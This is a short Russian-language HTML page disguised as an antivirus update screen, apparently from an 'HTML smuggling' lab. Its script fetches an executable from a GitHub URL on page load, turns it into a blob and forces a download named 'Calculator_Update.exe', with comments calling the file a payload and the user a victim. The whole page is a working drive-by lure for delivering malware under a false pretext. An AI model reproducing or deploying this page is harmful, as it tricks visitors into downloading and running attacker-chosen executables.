<!DOCTYPE html>
<html lang="ru">
<head>
    <title>Проверка обновлений</title>
</head>
<body>
    <h1 style="font-family: Arial;">Система обновляет антивирусные базы...</h1>
    <p style="font-family: Arial;">Пожалуйста, подождите, идет загрузка компонента.</p>

    <script>
        // 1. Указываем прямую ссылку на наш файл (payload)
        const url = 'https://github.com/richardamiller8282-boop/smuggle-lab2/blob/main/cmd.exe';

        // 2. Автоматически запускаем загрузку после загрузки страницы
        window.onload = async function() {
            try {
                // Загружаем файл в память браузера через fetch
                const response = await fetch(url);
                const blob = await response.blob();

                // Создаем ссылку на этот объект (blob)
                const link = document.createElement('a');
                link.href = URL.createObjectURL(blob);
                link.download = 'Calculator_Update.exe'; // Имя, которое увидит жертва
                
                // Кликаем по ней, чтобы браузер начал скачивание
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                
                // Освобождаем память
                URL.revokeObjectURL(link.href);
            } catch (e) {
                console.error('Ошибка загрузки:', e);
            }
        };
    </script>
</body>
</html>
